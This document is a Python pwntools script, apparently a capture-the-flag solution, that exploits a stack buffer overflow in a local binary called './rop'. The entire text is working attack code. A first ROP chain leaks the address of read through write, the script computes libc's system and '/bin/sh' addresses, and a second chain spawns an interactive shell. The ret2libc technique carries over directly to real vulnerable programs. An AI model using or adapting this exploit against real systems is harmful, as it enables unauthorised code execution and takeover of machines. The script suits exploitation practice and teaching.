from pwn import *
p=process("./rop")
libc=ELF("./libc-2.27.so")
elf=ELF("./rop")

write_plt=elf.plt["write"]
read_got=elf.got["read"]

vuln=elf.symbols["main"]
pop_rdi=0x0000000000400643
pop_rsi=0x0000000000400641
offset=136
raw_input(">")
pay=offset*b"a"+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(read_got)+p64(1)+p64(write_plt)+p64(vuln)

p.sendline(pay)
#print(p.recv())
read_addr=u64(p.recv()[:8])
print(hex(read_addr))

libc_base=read_addr-libc.symbols["read"]
libc_system=libc_base+libc.symbols["system"]
bin_sh=libc_base+libc.search("/bin/sh").__next__()

pay2=offset*b"a"+p64(pop_rdi)+p64(bin_sh)+p64(libc_system)


p.sendline(pay2)

p.interactive()
